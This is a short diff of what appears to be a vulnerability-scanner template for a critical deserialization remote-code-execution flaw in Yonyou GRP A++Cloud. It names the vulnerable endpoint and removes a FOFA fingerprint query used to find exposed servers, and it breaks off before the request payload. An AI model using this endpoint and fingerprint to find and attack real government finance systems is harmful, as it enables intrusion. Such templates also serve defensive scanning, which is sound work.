@@ -3,12 +3,8 @@ info:
   name: 用友GRP A++Cloud 政府财务云rectifyAuditGaDoubt反序列化远程代码执行
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rpoweh2fyx5owh7y'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: rpoweh2fyx5owh7y
-    fofa: body="/pf/portal/login/css/fonts/style.css"
 http:
 - raw:
   - 'POST /ga/api/workflow/rectifyAuditGaDoubt HTTP/1.1
